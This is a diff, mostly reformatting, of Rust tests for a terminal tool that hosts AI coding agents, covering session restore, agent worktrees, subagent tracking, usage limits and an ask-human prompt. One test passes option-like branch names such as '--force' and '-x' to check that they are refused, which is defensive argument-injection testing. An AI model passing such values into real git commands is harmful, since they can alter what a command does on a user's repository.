+    assert_eq!(
+        d.terms[&helper].tab_of,
+        Some(starter),
+        "71 was a tab of 70's: it is again"
+    );
+    assert_eq!(
+        (d.terms[&orphan].tab_of, d.terms[&starter].tab_of),
+        (None, None),
+        "the rest are their own"
+    );
     // And it's saved that way again.
     let saved = d.saved();
-    assert_eq!(saved.workspaces[0].tabs[0].panes[&helper].started_by, Some(starter));
-    assert_eq!(saved.workspaces[0].tabs[0].panes[&helper].tab_of, Some(starter), "and saved that way again");
-    assert_eq!(saved.workspaces[0].tabs[0].panes[&helper].subagent_activity.len(), 2);
+    assert_eq!(
+        saved.workspaces[0].tabs[0].panes[&helper].started_by,
+        Some(starter)
+    );
+    assert_eq!(
+        saved.workspaces[0].tabs[0].panes[&helper].tab_of,
+        Some(starter),
+        "and saved that way again"
+    );
+    assert_eq!(
+        saved.workspaces[0].tabs[0].panes[&helper]
+            .subagent_activity
+            .len(),
+        2
+    );
     // A session saved before helpers were tracked still loads.
-    let old: persist::SavedPane = serde_json::from_str(r#"{"cwd":null,"cmd":null,"agent":null,"session":null}"#).expect("an older pane");
+    let old: persist::SavedPane =
+        serde_json::from_str(r#"{"cwd":null,"cmd":null,"agent":null,"session":null}"#)
+            .expect("an older pane");
     assert_eq!(old.started_by, None);
-    assert_eq!(old.tab_of, None, "a pane saved before tabs were kept is its own");
-    assert!(old.subagent_activity.is_empty(), "panes saved before child activity still load");
+    assert_eq!(
+        old.tab_of, None,
+        "a pane saved before tabs were kept is its own"
+    );
+    assert!(
+        old.subagent_activity.is_empty(),
+        "panes saved before child activity still load"
+    );
     // Fleet and commander state an older version saved is read and ignored.
     let fleet: persist::SavedPane = serde_json::from_str(r#"{"cwd":null,"cmd":null,"agent":"claude","session":null,"commander":true,"fleet":{"goal":"ship it","size":3},"started_by":4}"#).expect("a pane from a fleet");
-    assert_eq!((fleet.agent.as_deref(), fleet.started_by), (Some("claude"), Some(4)));
+    assert_eq!(
+        (fleet.agent.as_deref(), fleet.started_by),
+        (Some("claude"), Some(4))
+    );
     let old_save = r#"{"workspaces":[],"active":0,"made_worktrees":[],"fleets":[{"commander":1}]}"#;
-    assert!(serde_json::from_str::<persist::Saved>(old_save).is_ok(), "a save with fleet tables still loads");
+    assert!(
+        serde_json::from_str::<persist::Saved>(old_save).is_ok(),
+        "a save with fleet tables still loads"
+    );
     close(&mut d, &[helper, orphan, starter]);
 }
 
@@ -1030,9 +1877,30 @@ fn restore_gives_panes_new_ids_and_keeps_their_layout() {
     layout.split(70, crate::layout::Dir::Right, 71);
     layout.split(71, crate::layout::Dir::Down, 72);
     let mut panes = std::collections::BTreeMap::new();
-    panes.insert(70, persist::SavedPane { cwd: Some(dir.clone()), name: "left one".into(), label: "Map Gen".into(), ..Default::default() });
-    panes.insert(71, persist::SavedPane { cwd: Some(dir.clone()), model: "opus".into(), ..Default::default() });
-    panes.insert(72, persist::SavedPane { cwd: Some(dir.clone()), ..Default::default() });
+    panes.insert(
+        70,
+        persist::SavedPane {
+            cwd: Some(dir.clone()),
+            name: "left one".into(),
+            label: "Map Gen".into(),
+            ..Default::default()
+        },
+    );
+    panes.insert(
+        71,
+        persist::SavedPane {
+            cwd: Some(dir.clone()),
+            model: "opus".into(),
+            ..Default::default()
+        },
+    );
+    panes.insert(
+        72,
+        persist::SavedPane {
+            cwd: Some(dir.clone()),
+            ..Default::default()
+        },
+    );
     let saved = persist::Saved {
         workspaces: vec![persist::SavedWs {
             name: "api".into(),
@@ -1040,27 +1908,54 @@ fn restore_gives_panes_new_ids_and_keeps_their_layout() {
             worktree: false,
             color: None,
             group: None,
-            tabs: vec![persist::SavedTab { name: "main".into(), layout, focus: 71, panes }],
+            tabs: vec![persist::SavedTab {
+                name: "main".into(),
+                layout,
+                focus: 71,
+                panes,
+            }],
             active_tab: 0,
         }],
         active: 0,
         made_worktrees: Vec::new(),
+        conversations: Vec::new(),
+        pending_starts: Vec::new(),
+        conversation_operations: Vec::new(),
     };
     d.restore(saved);
     assert_eq!(d.workspaces.len(), 1);
     let tab = &d.workspaces[0].tabs[0];
     let leaves = tab.layout.leaves();
     assert_eq!(leaves.len(), 3, "all three panes came back");
-    assert!(leaves.iter().all(|t| d.terms.contains_key(t) && ![70, 71, 72].contains(t)), "with this run's ids");
+    assert!(
+        leaves
+            .iter()
+            .all(|t| d.terms.contains_key(t) && ![70, 71, 72].contains(t)),
+        "with this run's ids"
+    );
     let (left, right, below) = (leaves[0], leaves[1], leaves[2]);
     assert_eq!(tab.focus, right, "focus follows the pane it was on");
     let rects = tab.layout.rects(ratatui::layout::Rect::new(0, 0, 120, 40));
     let rect = |id| rects.iter().find(|(term, _)| *term == id).unwrap().1;
-    assert_eq!(rect(below).x, rect(right).x, "restoration retains the right-side column");
-    assert!(rect(below).y > rect(right).y, "restoration retains the down split");
+    assert_eq!(
+        rect(below).x,
+        rect(right).x,
+        "restoration retains the right-side column"
+    );
+    assert!(
+        rect(below).y > rect(right).y,
+        "restoration retains the down split"
+    );
     assert_eq!(d.terms[&left].first_prompt, "left one");
-    assert_eq!(d.terms[&left].label, "Map Gen", "the name you gave it comes back");
-    assert_eq!(d.saved().workspaces[0].tabs[0].panes[&left].label, "Map Gen", "and is saved again");
+    assert_eq!(
+        d.terms[&left].label, "Map Gen",
+        "the name you gave it comes back"
+    );
+    assert_eq!(
+        d.saved().workspaces[0].tabs[0].panes[&left].label,
+        "Map Gen",
+        "and is saved again"
+    );
     assert_eq!(d.terms[&right].model, "opus");
     close(&mut d, &leaves);
 }
@@ -1069,35 +1964,114 @@ fn restore_gives_panes_new_ids_and_keeps_their_layout() {
 fn worktree_names_that_look_like_options_are_refused() {
     let dir = std::env::temp_dir();
     for bad in ["", "-x", "a b", "--force"] {
-        assert!(git::create_worktree(&dir, bad, None, "{repo_parent}/{repo}-worktrees/{branch}").is_err(), "branch {bad:?}");
+        assert!(
+            git::create_worktree(&dir, bad, None, "{repo_parent}/{repo}-worktrees/{branch}")
+                .is_err(),
+            "branch {bad:?}"
+        );
     }
 }
 
 #[test]
 fn an_agent_typed_into_a_shell_gets_its_own_worktree() {
-    let tmp = std::env::temp_dir().join(format!(concat!(env!("APP_COMMAND"), "-agent-wt-{}"), std::process::id()));
+    let tmp = std::env::temp_dir().join(format!(
+        concat!(env!("APP_COMMAND"), "-agent-wt-{}"),
+        std::process::id()
+    ));
     let repo = tmp.join("shop");
     std::fs::create_dir_all(repo.join("web")).unwrap();
-    let git = |args: &[&str]| assert!(std::process::Command::new("git").arg("-C").arg(&repo).args(args).output().unwrap().status.success(), "git {args:?}");
+    let git = |args: &[&str]| {
+        assert!(
+            std::process::Command::new("git")
+                .arg("-C")
+                .arg(&repo)
+                .args(args)
+                .output()
+                .unwrap()
+                .status
+                .success(),
+            "git {args:?}"
+        )
+    };
     git(&["init", "-q"]);
-    git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "first"]);
+    git(&[
+        "-c",
+        "user.name=t",
+        "-c",
+        "user.email=t@t",
+        "commit",
+        "-q",
+        "--allow-empty",
+        "-m",
+        "first",
+    ]);
     std::fs::write(repo.join("web").join("keep"), "").unwrap();
     git(&["add", "."]);
-    git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "web"]);
-    let made = worktrees::agent_worktree(&repo.join("web"), "{repo_parent}/{repo}-worktrees/{branch}").unwrap();
-    assert!(made.ends_with("web") && made.is_dir(), "in the same subfolder of the new worktree: {}", made.display());
+    git(&[
+        "-c",
+        "user.name=t",
+        "-c",
+        "user.email=t@t",
+        "commit",
+        "-q",
+        "-m",
+        "web",
+    ]);
+    let made =
+        worktrees::agent_worktree(&repo.join("web"), "{repo_parent}/{repo}-worktrees/{branch}")
+            .unwrap();
+    assert!(
+        made.ends_with("web") && made.is_dir(),
+        "in the same subfolder of the new worktree: {}",
+        made.display()
+    );
     let head = crate::gitfs::head(&made).unwrap();
-    assert!(head.linked && crate::gitfs::WT_NAMES.contains(&head.branch.as_str()), "a linked worktree on a made-up branch: {head:?}");
-    let again = worktrees::agent_worktree(&repo, "{repo_parent}/{repo}-worktrees/{branch}").unwrap();
+    assert!(
+        head.linked && crate::gitfs::WT_NAMES.contains(&head.branch.as_str()),
+        "a linked worktree on a made-up branch: {head:?}"
+    );
+    let again =
+        worktrees::agent_worktree(&repo, "{repo_parent}/{repo}-worktrees/{branch}").unwrap();
     let other = crate::gitfs::head(&again).unwrap().branch;
     assert_ne!(other, head.branch, "the next one gets its own branch");
     // Closing them: a merged branch goes with its worktree, one with work of its own stays.
-    let wt = |dir: &std::path::Path, args: &[&str]| assert!(std::process::Command::new("git").arg("-C").arg(dir).args(args).output().unwrap().status.success(), "git {args:?}");
-    wt(&again, &["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "work"]);
+    let wt = |dir: &std::path::Path, args: &[&str]| {
+        assert!(
+            std::process::Command::new("git")
+                .arg("-C")
+                .arg(dir)
+                .args(args)
+                .output()
+                .unwrap()
+                .status
+                .success(),
+            "git {args:?}"
+        )
+    };
+    wt(
+        &again,
+        &[
+            "-c",
+            "user.name=t",
+            "-c",
+            "user.email=t@t",
+            "commit",
+            "-q",
+            "--allow-empty",
+            "-m",
+            "work",
+        ],
+    );
     git::remove_worktree(&crate::gitfs::head(&made).unwrap().top, false, false).unwrap();
     git::remove_worktree(&again, false, false).unwrap();
-    assert!(git::delete_if_merged(&repo, &head.branch), "nothing on it that main doesn't have: deleted");
-    assert!(!git::delete_if_merged(&repo, &other), "a commit main doesn't have: kept");
+    assert!(
+        git::delete_if_merged(&repo, &head.branch),
+        "nothing on it that main doesn't have: deleted"
+    );
+    assert!(
+        !git::delete_if_merged(&repo, &other),
+        "a commit main doesn't have: kept"
+    );
     let _ = std::fs::remove_dir_all(&tmp);
 }
 
@@ -1107,22 +2081,46 @@ fn only_a_pane_shell_asks_for_an_agent_worktree() {
     let t = pane(&mut d);
     let (tx, mut crx) = mpsc::channel(64);
     d.handle(Ev::Connected(1, tx, false));
-    d.handle(Ev::Msg(1, ClientMsg::Command(Command::AgentWorktree { dir: std::env::current_dir().unwrap() })));
-    assert!(matches!(crx.try_recv(), Ok(ServerMsg::Reply(Reply::Text(p))) if p.is_empty()), "not from a pane: start where it is");
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Command(Command::AgentWorktree {
+            dir: std::env::current_dir().unwrap(),
+        }),
+    ));
+    assert!(
+        matches!(crx.try_recv(), Ok(ServerMsg::Reply(Reply::Text(p))) if p.is_empty()),
+        "not from a pane: start where it is"
+    );
     d.terms.get_mut(&t).unwrap().agent = Some("claude".into());
     let (tx, mut crx) = mpsc::channel(64);
     d.handle(Ev::Connected(2, tx, false));
     let token = d.terms[&t].token.clone();
     d.handle(Ev::From(2, t, token));
-    d.handle(Ev::Msg(2, ClientMsg::Command(Command::AgentWorktree { dir: std::env::current_dir().unwrap() })));
-    assert!(matches!(crx.try_recv(), Ok(ServerMsg::Reply(Reply::Text(p))) if p.is_empty()), "an agent's own agents work where it does");
+    d.handle(Ev::Msg(
+        2,
+        ClientMsg::Command(Command::AgentWorktree {
+            dir: std::env::current_dir().unwrap(),
+        }),
+    ));
+    assert!(
+        matches!(crx.try_recv(), Ok(ServerMsg::Reply(Reply::Text(p))) if p.is_empty()),
+        "an agent's own agents work where it does"
+    );
     // Another pane's id with the wrong secret is not that pane: nothing is made for it.
     d.terms.get_mut(&t).unwrap().agent = None;
     let (tx, mut crx) = mpsc::channel(64);
     d.handle(Ev::Connected(3, tx, false));
     d.handle(Ev::From(3, t, "not-the-secret".into()));
-    d.handle(Ev::Msg(3, ClientMsg::Command(Command::AgentWorktree { dir: std::env::current_dir().unwrap() })));
-    assert!(matches!(crx.try_recv(), Ok(ServerMsg::Reply(Reply::Text(p))) if p.is_empty()), "a forged pane id gets no worktree");
+    d.handle(Ev::Msg(
+        3,
+        ClientMsg::Command(Command::AgentWorktree {
+            dir: std::env::current_dir().unwrap(),
+        }),
+    ));
+    assert!(
+        matches!(crx.try_recv(), Ok(ServerMsg::Reply(Reply::Text(p))) if p.is_empty()),
+        "a forged pane id gets no worktree"
+    );
     close(&mut d, &[t]);
 }
 
@@ -1131,24 +2129,57 @@ fn an_agent_stopped_by_a_limit_is_told_to_continue_when_it_resets() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
     let now = term::unix_now();
-    d.limits.insert("claude".into(), vec![Limit { name: "5h".into(), used: 100.0, resets_at: now + 600 }, Limit { name: "week".into(), used: 40.0, resets_at: now + 90_000 }]);
+    d.limits.insert(
+        "claude".into(),
+        vec![
+            Limit {
+                name: "5h".into(),
+                used: 100.0,
+                resets_at: now + 600,
+            },
+            Limit {
+                name: "week".into(),
+                used: 40.0,
+                resets_at: now + 90_000,
+            },
+        ],
+    );
     {
         let p = d.terms.get_mut(&t).unwrap();
         (p.agent, p.status) = (Some("claude".into()), Status::Idle);
         p.parser.process(&b"\r\n".repeat(30));
-        p.parser.process(b"\r\n  \xe2\x8e\xbf  Claude usage limit reached. Your limit will reset at 3pm\r\n> ");
+        p.parser.process(
+            b"\r\n  \xe2\x8e\xbf  Claude usage limit reached. Your limit will reset at 3pm\r\n> ",
+        );
     }
     d.auto_continue();
-    assert_eq!(d.terms[&t].resume_at, Some(now + 600 + 60), "a minute after the spent limit resets");
-    assert!(d.snapshot().terms[&t].resume_at.is_some(), "and the window says so");
+    assert_eq!(
+        d.terms[&t].resume_at,
+        Some(now + 600 + 60),
+        "a minute after the spent limit resets"
+    );
+    assert!(
+        d.snapshot().terms[&t].resume_at.is_some(),
+        "and the window says so"
+    );
     d.auto_continue();
     assert!(d.terms[&t].pending_input.is_none(), "not before");
     d.terms.get_mut(&t).unwrap().resume_at = Some(now - 1);
     d.auto_continue();
-    assert_eq!(d.terms[&t].pending_input.as_ref().map(|(b, _)| b.as_slice()), Some(&b"continue\r"[..]), "then it's told to go on");
+    assert_eq!(
+        d.terms[&t]
+            .pending_input
+            .as_ref()
+            .map(|(b, _)| b.as_slice()),
+        Some(&b"continue\r"[..]),
+        "then it's told to go on"
+    );
     d.terms.get_mut(&t).unwrap().pending_input = None;
     d.auto_continue();
-    assert!(d.terms[&t].resume_at.is_none(), "the old line still on screen doesn't start another wait");
+    assert!(
+        d.terms[&t].resume_at.is_none(),
+        "the old line still on screen doesn't start another wait"
+    );
     // Off in Settings: nothing.
     d.cfg.auto_continue = false;
     d.terms.get_mut(&t).unwrap().continued = None;
@@ -1163,34 +2194,92 @@ fn claude_reports_what_its_session_used() {
     let t = pane(&mut d);
     let token = d.terms[&t].token.clone();
     d.terms.get_mut(&t).unwrap().agent = Some("claude".into());
-    let usage = |cost: f64| Usage { context: Some(30.0), cost: Some(cost) };
-    let limits = vec![Limit { name: "5h".into(), used: 23.0, resets_at: term::unix_now() + 100 }];
-    d.handle(Ev::Msg(1, ClientMsg::Usage { term: t, token: "wrong".into(), usage: usage(9.0), limits: Vec::new() }));
-    assert_eq!(d.terms[&t].usage, Usage::default(), "only with the pane's secret");
-    d.handle(Ev::Msg(1, ClientMsg::Usage { term: t, token: token.clone(), usage: usage(1.0), limits: limits.clone() }));
-    d.handle(Ev::Msg(1, ClientMsg::Usage { term: t, token: token.clone(), usage: usage(1.5), limits }));
+    let usage = |cost: f64| Usage {
+        context: Some(30.0),
+        cost: Some(cost),
+    };
+    let limits = vec![Limit {
+        name: "5h".into(),
+        used: 23.0,
+        resets_at: term::unix_now() + 100,
+    }];
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Usage {
+            term: t,
+            token: "wrong".into(),
+            usage: usage(9.0),
+            limits: Vec::new(),
+        },
+    ));
+    assert_eq!(
+        d.terms[&t].usage,
+        Usage::default(),
+        "only with the pane's secret"
+    );
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Usage {
+            term: t,
+            token: token.clone(),
+            usage: usage(1.0),
+            limits: limits.clone(),
+        },
+    ));
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Usage {
+            term: t,
+            token: token.clone(),
+            usage: usage(1.5),
+            limits,
+        },
+    ));
     // /clear: a new session, counting from zero again.
-    d.handle(Ev::Msg(1, ClientMsg::Usage { term: t, token, usage: usage(0.25), limits: Vec::new() }));
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Usage {
+            term: t,
+            token,
+            usage: usage(0.25),
+            limits: Vec::new(),
+        },
+    ));
     let snap = d.snapshot();
     assert_eq!(snap.terms[&t].usage.context, Some(30.0));
-    assert!((snap.spent_today - 1.75).abs() < 1e-9, "1.50 then 0.25 after the clear: {}", snap.spent_today);
+    assert!(
+        (snap.spent_today - 1.75).abs() < 1e-9,
+        "1.50 then 0.25 after the clear: {}",
+        snap.spent_today
+    );
     assert_eq!(snap.limits[0].0, "claude");
     close(&mut d, &[t]);
 }
-
-
 
 /// Tests that write or delete saved pane output share one folder per test run: one at a time.
 static SAVED_OUTPUT: std::sync::Mutex<()> = std::sync::Mutex::new(());
 
 #[test]
 fn a_panes_history_survives_the_server_restarting() {
-    let _one_at_a_time = SAVED_OUTPUT.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+    let _one_at_a_time = SAVED_OUTPUT
+        .lock()
+        .unwrap_or_else(std::sync::PoisonError::into_inner);
     let (mut d, _rx) = daemon();
     d.cfg.restore.enabled = true;
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let t = *d.terms.keys().next().unwrap();
-    d.terms.get_mut(&t).unwrap().ring_push_for_test(b"line from before the restart\r\n");
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .ring_push_for_test(b"line from before the restart\r\n");
     let saved = d.saved();
     d.save_outputs(true);
     // A new server: the pane comes back, with what it showed above what it shows now.
@@ -1199,11 +2288,19 @@ fn a_panes_history_survives_the_server_restarting() {
     d2.restore(saved);
     let new = *d2.terms.keys().next().unwrap();
     let replay = String::from_utf8_lossy(&d2.terms[&new].replay()).into_owned();
-    assert!(replay.contains("line from before the restart") && replay.contains(concat!(env!("APP_COMMAND"), " restarted here")), "{replay}");
+    assert!(
+        replay.contains("line from before the restart")
+            && replay.contains(concat!(env!("APP_COMMAND"), " restarted here")),
+        "{replay}"
+    );
     let mut p = vt100::Parser::new(24, 80, 1000);
     p.process(&d2.terms[&new].replay());
     p.screen_mut().set_scrollback(usize::MAX);
-    assert!(p.screen().scrollback() >= 24, "the old screen went up into history: {}", p.screen().scrollback());
+    assert!(
+        p.screen().scrollback() >= 24,
+        "the old screen went up into history: {}",
+        p.screen().scrollback()
+    );
     assert!(persist::take_output(t).is_none(), "taken once");
     close(&mut d, &[t]);
     close(&mut d2, &[new]);
@@ -1216,9 +2313,15 @@ fn closing_the_last_pane_keeps_an_open_window() {
     let (tx, _crx) = mpsc::channel(64);
     d.handle(Ev::Connected(1, tx, true));
     d.close_term(t);
-    assert!(!d.should_exit(), concat!("a window is still showing ", env!("APP_COMMAND")));
+    assert!(
+        !d.should_exit(),
+        concat!("a window is still showing ", env!("APP_COMMAND"))
+    );
     d.handle(Ev::Disconnected(1));
-    assert!(d.should_exit(), "everything closed and nobody's looking: exit");
+    assert!(
+        d.should_exit(),
+        "everything closed and nobody's looking: exit"
+    );
 }
 
 #[test]
@@ -1232,29 +2335,75 @@ fn a_turn_waiting_on_background_agents_stays_working() {
         }
         m
     };
-    let agent = |start: bool| Some(Subagent { id: "a1".into(), kind: "general-purpose".into(), start, reported_at: 0, task: None, model: None, effort: None, activity: None });
-    d.apply_hook(hook(HookStatus::Working, "UserPromptSubmit", None), Some(true), Vec::new());
-    d.apply_hook(hook(HookStatus::Working, "SubagentStart", agent(true)), Some(true), Vec::new());
-    d.apply_hook(hook(HookStatus::Working, "SubagentStart", agent(true)), Some(true), Vec::new());
-    assert_eq!(d.terms[&t].subagent_activity.len(), 1, "repeated start events do not duplicate the record");
-    assert_eq!(d.terms[&t].subagent_activity[0].state, SubagentState::Working);
+    let agent = |start: bool| {
+        Some(Subagent {
+            id: "a1".into(),
+            kind: "general-purpose".into(),
+            start,
+            reported_at: 0,
+            task: None,
+            model: None,
+            effort: None,
+            activity: None,
+        })
+    };
+    d.apply_hook(
+        hook(HookStatus::Working, "UserPromptSubmit", None),
+        Some(true),
+        Vec::new(),
+    );
+    d.apply_hook(
+        hook(HookStatus::Working, "SubagentStart", agent(true)),
+        Some(true),
+        Vec::new(),
+    );
+    d.apply_hook(
+        hook(HookStatus::Working, "SubagentStart", agent(true)),
+        Some(true),
+        Vec::new(),
+    );
+    assert_eq!(
+        d.terms[&t].subagent_activity.len(),
+        1,
+        "repeated start events do not duplicate the record"
+    );
+    assert_eq!(
+        d.terms[&t].subagent_activity[0].state,
+        SubagentState::Working
+    );
     // Claude's own turn ends ("waiting for 1 background agent"): still working.
     d.apply_hook(hook(HookStatus::Done, "Stop", None), Some(true), Vec::new());
     assert_eq!(d.terms[&t].status, Status::Working);
     // Long past the old three minutes, the agent is still at it (its own tool use): still
     // working, still listed once.
-    let ago = |mins: u64| Instant::now().checked_sub(Duration::from_secs(mins * 60)).unwrap();
+    let ago = |mins: u64| {
+        Instant::now()
+            .checked_sub(Duration::from_secs(mins * 60))
+            .unwrap()
+    };
     d.terms.get_mut(&t).unwrap().done_held = Some(ago(20));
-    d.apply_hook(hook(HookStatus::Same, "PreToolUse", agent(true)), Some(true), Vec::new());
+    d.apply_hook(
+        hook(HookStatus::Same, "PreToolUse", agent(true)),
+        Some(true),
+        Vec::new(),
+    );
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "held while the agent runs");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "held while the agent runs"
+    );
     assert_eq!(d.terms[&t].subagents.len(), 1, "listed once");
     // Nothing from it for over an hour: it died without saying; the turn is done.
     let term = d.terms.get_mut(&t).unwrap();
     (term.done_held, term.subagent_seen) = (Some(ago(70)), Some(ago(70)));
     d.update_statuses();
     assert_ne!(d.terms[&t].status, Status::Working, "not held forever");
-    assert_eq!(d.terms[&t].subagent_activity[0].state, SubagentState::ConnectionLost, "quiet child is retained as unconfirmed, not completed");
+    assert_eq!(
+        d.terms[&t].subagent_activity[0].state,
+        SubagentState::ConnectionLost,
+        "quiet child is retained as unconfirmed, not completed"
+    );
     let terms: Vec<TermId> = d.terms.keys().copied().collect();
     close(&mut d, &terms);
 }
@@ -1263,14 +2412,22 @@ fn a_turn_waiting_on_background_agents_stays_working() {
 fn a_progress_bar_that_goes_off_while_helpers_run_is_not_a_cancel() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
-    let ago = |secs: u64| Instant::now().checked_sub(Duration::from_secs(secs)).unwrap();
+    let ago = |secs: u64| {
+        Instant::now()
+            .checked_sub(Duration::from_secs(secs))
+            .unwrap()
+    };
     {
         let p = d.terms.get_mut(&t).unwrap();
         (p.agent, p.hooked, p.status) = (Some("claude".into()), true, Status::Working);
         p.progress_off = Some(ago(5));
     }
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Idle, "control: with nothing running, a bar that went off is a cancel");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Idle,
+        "control: with nothing running, a bar that went off is a cancel"
+    );
     {
         let p = d.terms.get_mut(&t).unwrap();
         p.status = Status::Working;
@@ -1279,7 +2436,11 @@ fn a_progress_bar_that_goes_off_while_helpers_run_is_not_a_cancel() {
         p.subagent_seen = Some(Instant::now());
     }
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "the agent is waiting on its helper, not cancelled");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "the agent is waiting on its helper, not cancelled"
+    );
     close(&mut d, &[t]);
 }
 
@@ -1290,17 +2451,46 @@ fn a_stop_for_an_unknown_helper_leaves_the_running_ones_alone() {
     let hook = |status: HookStatus, event: &str, id: &str, start: bool| {
         let mut m = report(t, "", 0, status, event);
         if let ClientMsg::Hook { subagent, .. } = &mut m {
-            *subagent = Some(Subagent { id: id.into(), kind: "general-purpose".into(), start, reported_at: 0, task: None, model: None, effort: None, activity: None });
+            *subagent = Some(Subagent {
+                id: id.into(),
+                kind: "general-purpose".into(),
+                start,
+                reported_at: 0,
+                task: None,
+                model: None,
+                effort: None,
+                activity: None,
+            });
         }
         m
     };
-    d.apply_hook(hook(HookStatus::Working, "SubagentStart", "a1", true), Some(true), Vec::new());
-    d.apply_hook(hook(HookStatus::Working, "SubagentStart", "a2", true), Some(true), Vec::new());
+    d.apply_hook(
+        hook(HookStatus::Working, "SubagentStart", "a1", true),
+        Some(true),
+        Vec::new(),
+    );
+    d.apply_hook(
+        hook(HookStatus::Working, "SubagentStart", "a2", true),
+        Some(true),
+        Vec::new(),
+    );
     // One that began before the app was listening stops: nobody listed has finished.
-    d.apply_hook(hook(HookStatus::Same, "SubagentStop", "never-seen", false), Some(true), Vec::new());
+    d.apply_hook(
+        hook(HookStatus::Same, "SubagentStop", "never-seen", false),
+        Some(true),
+        Vec::new(),
+    );
     assert_eq!(d.terms[&t].subagents.len(), 2, "both still listed");
-    d.apply_hook(hook(HookStatus::Same, "SubagentStop", "a1", false), Some(true), Vec::new());
-    assert_eq!(d.terms[&t].subagents, vec![("a2".to_string(), "general-purpose".to_string())], "only the one that stopped goes");
+    d.apply_hook(
+        hook(HookStatus::Same, "SubagentStop", "a1", false),
+        Some(true),
+        Vec::new(),
+    );
+    assert_eq!(
+        d.terms[&t].subagents,
+        vec![("a2".to_string(), "general-purpose".to_string())],
+        "only the one that stopped goes"
+    );
     close(&mut d, &[t]);
 }
 
@@ -1309,14 +2499,31 @@ fn a_session_starting_again_while_helpers_run_keeps_the_agent_working() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
     let plain = |status: HookStatus, event: &str| report(t, "", 0, status, event);
-    d.apply_hook(plain(HookStatus::Working, "UserPromptSubmit"), Some(true), Vec::new());
+    d.apply_hook(
+        plain(HookStatus::Working, "UserPromptSubmit"),
+        Some(true),
+        Vec::new(),
+    );
     let mut start = plain(HookStatus::Working, "SubagentStart");
     if let ClientMsg::Hook { subagent, .. } = &mut start {
-        *subagent = Some(Subagent { id: "a1".into(), kind: "general-purpose".into(), start: true, reported_at: 0, task: None, model: None, effort: None, activity: None });
+        *subagent = Some(Subagent {
+            id: "a1".into(),
+            kind: "general-purpose".into(),
+            start: true,
+            reported_at: 0,
+            task: None,
+            model: None,
+            effort: None,
+            activity: None,
+        });
     }
     d.apply_hook(start, Some(true), Vec::new());
     // Compaction starts the session again in the middle of the turn.
-    d.apply_hook(plain(HookStatus::Idle, "SessionStart"), Some(true), Vec::new());
+    d.apply_hook(
+        plain(HookStatus::Idle, "SessionStart"),
+        Some(true),
+        Vec::new(),
+    );
     assert_eq!(d.terms[&t].status, Status::Working, "still working");
     assert_eq!(d.terms[&t].subagents.len(), 1, "its helper is still listed");
     close(&mut d, &[t]);
@@ -1327,25 +2534,48 @@ fn delayed_child_start_does_not_undo_its_completion() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
     d.terms.get_mut(&t).unwrap().session = Some("parent-thread".into());
-    let child = |start, reported_at| Some(Subagent {
-        id: "child-1".into(), kind: "reviewer".into(), start, reported_at,
-        task: Some("review the change".into()), model: Some("claude-opus".into()), effort: None,
-        activity: Some(if start { "SubagentStart" } else { "SubagentStop" }.into()),
-    });
+    let child = |start, reported_at| {
+        Some(Subagent {
+            id: "child-1".into(),
+            kind: "reviewer".into(),
+            start,
+            reported_at,
+            task: Some("review the change".into()),
+            model: Some("claude-opus".into()),
+            effort: None,
+            activity: Some(
+                if start {
+                    "SubagentStart"
+                } else {
+                    "SubagentStop"
+                }
+                .into(),
+            ),
+        })
+    };
     let mut start = report(t, "", 0, HookStatus::Working, "SubagentStart");
-    if let ClientMsg::Hook { subagent, .. } = &mut start { *subagent = child(true, 100); }
+    if let ClientMsg::Hook { subagent, .. } = &mut start {
+        *subagent = child(true, 100);
+    }
     d.apply_hook(start, Some(true), Vec::new());
     let mut stop = report(t, "", 0, HookStatus::Same, "SubagentStop");
-    if let ClientMsg::Hook { subagent, .. } = &mut stop { *subagent = child(false, 200); }
+    if let ClientMsg::Hook { subagent, .. } = &mut stop {
+        *subagent = child(false, 200);
+    }
     d.apply_hook(stop, Some(true), Vec::new());
     let mut delayed_start = report(t, "", 0, HookStatus::Working, "SubagentStart");
-    if let ClientMsg::Hook { subagent, .. } = &mut delayed_start { *subagent = child(true, 150); }
+    if let ClientMsg::Hook { subagent, .. } = &mut delayed_start {
+        *subagent = child(true, 150);
+    }
     d.apply_hook(delayed_start, Some(true), Vec::new());
 
     let activity = &d.terms[&t].subagent_activity[0];
     assert_eq!(activity.state, SubagentState::Completed);
     assert_eq!(activity.updated_at, 200);
-    assert!(d.terms[&t].subagents.is_empty(), "a delayed start cannot recreate a live child");
+    assert!(
+        d.terms[&t].subagents.is_empty(),
+        "a delayed start cannot recreate a live child"
+    );
     assert_eq!(activity.parent.as_deref(), Some("parent-thread"));
     assert_eq!(activity.task.as_deref(), Some("review the change"));
     assert_eq!(activity.model.as_deref(), Some("claude-opus"));
@@ -1359,13 +2589,24 @@ fn an_agent_asks_you_and_gets_your_answer() {
     // The agent's `<app> ask-human` is a client waiting for the reply.
     let (tx, mut asker) = mpsc::channel(8);
     d.handle(Ev::Connected(5, tx, false));
-    let ask = Command::AskHuman { term: t, text: "Deploy to staging?".into(), options: vec!["Yes".into(), "No".into()] };
+    let ask = Command::AskHuman {
+        term: t,
+        text: "Deploy to staging?".into(),
+        options: vec!["Yes".into(), "No".into()],
+    };
